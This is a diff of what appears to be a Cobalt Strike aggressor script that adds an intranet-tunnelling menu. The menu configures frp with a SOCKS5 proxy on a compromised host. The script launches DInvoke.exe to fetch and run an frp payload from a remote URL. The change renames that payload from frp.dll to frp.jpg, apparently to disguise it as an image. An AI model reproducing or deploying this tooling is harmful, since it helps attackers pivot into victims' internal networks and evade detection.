@@ -1,6 +1,6 @@
 include(script_resource("config.cna"));
 menu "☆ 内网穿透" {
-    item "frp" {
+    item "Frp" {
         blog($1, "\c9=========== 配置并运行 frp ==========");
         $bid = $1['@'];
         $Dialog = dialog("配置并运行 frp", %(ip => "", port => "7000", socks5_port => "1080", protocol => "tcp", bid => $bid), &run_frp);
@@ -29,7 +29,7 @@ sub run_frp {
 
     # 准备要执行的程序路径和参数
     $exe = script_resource("/scripts/DInvoke.exe");
-    $param = "--url " . $url . "/IntrAgent/x64/frp.dll --config " . $base64Config;
+    $param = "--url " . $url . "/IntrAgent/x64/frp.jpg --config " . $base64Config;
 
     # 打印最终的执行命令
     #blog2($bid, "最终执行的命令: $exe $param");
